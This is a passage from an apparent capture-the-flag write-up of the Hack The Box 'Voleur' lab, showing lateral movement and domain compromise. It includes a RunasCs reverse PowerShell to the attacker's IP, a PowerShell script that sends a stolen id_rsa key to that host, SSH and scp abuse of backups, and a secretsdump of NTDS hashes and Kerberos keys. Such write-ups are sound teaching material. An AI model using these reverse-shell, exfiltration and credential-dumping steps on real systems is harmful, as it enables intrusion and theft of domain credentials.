Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m

```

### Shell as  jeremy.combs

![Pasted image 20260610143401.png](/ob/Pasted%20image%2020260610143401.png)

```
evil-winrm-py PS C:\Users\svc_winrm\Documents> .\RunasCs.exe jeremy.combs  qT3V9pLXyN7W4m  powershell -r 10.10.16.128:443
 
[*] Warning: The logon for user 'jeremy.combs' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-18ee0d$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5232 created in background.

```

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $sudo rlwrap -cAr nc -lnvp 443
[sudo] password for tester: 
Listening on 0.0.0.0 443
Connection received on 10.129.232.130 61521
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami 
whoami 
voleur\jeremy.combs

```

```
PS C:\Program Files (x86)> net user jeremy.combs
 
net user jeremy.combs
User name                    jeremy.combs
Full Name                    Jeremy Combs
Comment                      Third-Line Support Technician
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/29/2025 8:10:32 AM
Password expires             Never
Password changeable          1/30/2025 8:10:32 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/10/2026 7:35:06 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Third-Line Technician*Domain Users         
The command completed successfully.


```

```
PS C:\Users> tree /f . 
tree /f . 
Folder PATH listing
Volume serial number is 000001B9 A5C3:6454
C:\USERS
+---Administrator
+---jeremy.combs
�   +---3D Objects
�   +---Contacts
�   +---Desktop
�   �       Microsoft Edge.lnk
�   �       
�   +---Documents
�   +---Downloads
�   +---Favorites
�   �   �   Bing.url
�   �   �   
�   �   +---Links
�   +---Links
�   �       Desktop.lnk
�   �       Downloads.lnk
�   �       
�   +---Music
�   +---Pictures
�   +---Saved Games
�   +---Searches
�   +---Videos
+---Public
�   +---Documents
�   +---Downloads
�   +---Music
�   +---Pictures
�   +---Videos
+---svc_backup
+---svc_ldap
+---svc_winrm
+---todd.wolfe

```

```
PS C:\> net user  jeremy.combs
net user  jeremy.combs
User name                    jeremy.combs
Full Name                    Jeremy Combs
Comment                      Third-Line Support Technician
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/29/2025 8:10:32 AM
Password expires             Never
Password changeable          1/30/2025 8:10:32 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/10/2026 7:46:27 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Third-Line Technician*Domain Users         
The command completed successfully.


```

```
PS C:\IT> tree /f . 
tree /f . 
Folder PATH listing
Volume serial number is 000001CF A5C3:6454
C:\IT
+---First-Line Support
+---Second-Line Support
+---Third-Line Support
    �   id_rsa
    �   Note.txt.txt
    �   
    +---Backups

```

```
# 1. Read the local file bytes first
$filePath = "C:\IT\Third-Line Support\id_rsa"
$bytes = [System.IO.File]::ReadAllBytes($filePath)

# 2. Establish the connection immediately before sending
$client = New-Object System.Net.Sockets.TcpClient('10.10.16.128', 4444) # Ensure port matches your listener
$stream = $client.GetStream()

# 3. Write the data over the wire
$stream.Write($bytes, 0, $bytes.Length)

# 4. Clean up the connection cleanly
$stream.Close()
$client.Close()
```

{{< toggle "Tag 🏷️" >}}

{{< tag "ssh-idrsa-decode" >}} having the id\_rsa only, but i dont know the username , so I can use the  ssh-keygen and strings to find back the username

{{< /toggle >}}

The user that created the key is stored in the encoded data of the key as the comment. I’ll base64 decode the key and run `strings`, and the last one is “svc\_backup@DC”:

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $cat id_rsa | grep -v '\----' | base64 -d | strings
openssh-key-v1
none
none
ssh-rsa
3Yks
qez4
ssh-rsa
3Yks
qez4
lfZ|7
elT~
<.-0N
-:BDO@|+6m
`x[3
<($X
/0>lcX/
Er.s
ve"b
V(:IxS`0
P}73"
srU7
svc_backup@DC
```

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $ssh-keygen -y -f id_rsa 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoXI8y9RFb+pvJGV6YAzNo9W99Hsk0fOcvrEMc/ij+GpYjOfd1nro/ZpuwyBnLZdcZ/ak7QzXdSJ2IFoXd0s0vtjVJ5L8MyKwTjXXMfHoBAx6mPQwYGL9zVR+LutUyr5fo0mdva/mkLOmjKhs41aisFcwpX0OdtC6ZbFhcpDKvq+BKst3ckFbpM1lrc9ZOHL3CtNE56B1hqoKPOTc+xxy3ro+GZA/JaR5VsgZkCoQL951843OZmMxuft24nAgvlzrwwy4KL273UwDkUCKCc22C+9hWGr+kuSFwqSHV6JHTVPJSZ4dUmEFAvBXNwc11WT4Y743OHJE6q7GFppWNw7wvcow9g1RmX9zii/zQgbTiEC8BAgbI28A+4RcacsSIpFw2D6a8jr+wshxTmhCQ8kztcWV6NIod+Alw/VbcwwMBgqmQC5lMnBI/0hJVWWPhH+V9bXy0qKJe7KA4a52bcBtjrkKU7A/6xjv6tc5MDacneoTQnyAYSJLwMXM84XzQ4us= svc_backup@DC

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $ssh -i ./id_rsa -p 2222 svc_backup@dc.voleur.htb
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun 10 09:40:47 PDT 2026

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   31%       IPv4 address for eth0: 10.129.232.130
  Swap usage:     0%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                      [ OK ] 
svc_backup@DC:~$ 
```

```
svc_backup@DC:/$ uname -a
Linux DC 4.4.0-20348-Microsoft #2849-Microsoft Thu Nov 01 17:32:00 PST 2024 x86_64 x86_64 x86_64 GNU/Linux
```

```
svc_backup@DC:/$ ls mnt 
c
```

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur/Active Directory]
└──╼ $scp -P 2222 -i ./id_rsa -r "svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory" .

```

```
oxdf@hacky$ secretsdump.py LOCAL -system SYSTEM -security SECURITY -ntds ntds.dit
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...
```
